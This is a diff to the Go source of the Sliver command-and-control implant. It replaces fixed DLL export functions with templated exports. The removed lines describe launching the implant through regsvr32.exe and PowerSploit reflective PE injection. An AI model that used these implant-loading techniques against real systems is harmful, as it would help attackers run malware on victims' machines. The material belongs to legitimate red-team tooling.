@@ -113,42 +113,15 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 // {{if or .Config.IsSharedLib .Config.IsShellcode}}
 var isRunning bool = false
 
-// StartW - Export for shared lib build
-//
-//export StartW
-func StartW() {
+// {{range .Config.Exports}}
+//export {{.}}
+func {{.}} () {
 	if !isRunning {
 		isRunning = true
 		main()
 	}
 }
-
-// Thanks Ne0nd0g for those
-//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
-
-// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
-//
-//export VoidFunc
-func VoidFunc() { main() }
-
-// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
-// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
-//
-//export DllInstall
-func DllInstall() { main() }
-
-// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
-// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
-//
-//export DllRegisterServer
-func DllRegisterServer() { main() }
-
-// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
-// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
-//
-//export DllUnregisterServer
-func DllUnregisterServer() { main() }
-
+// {{end}}
 // {{end}}
 
 func main() {
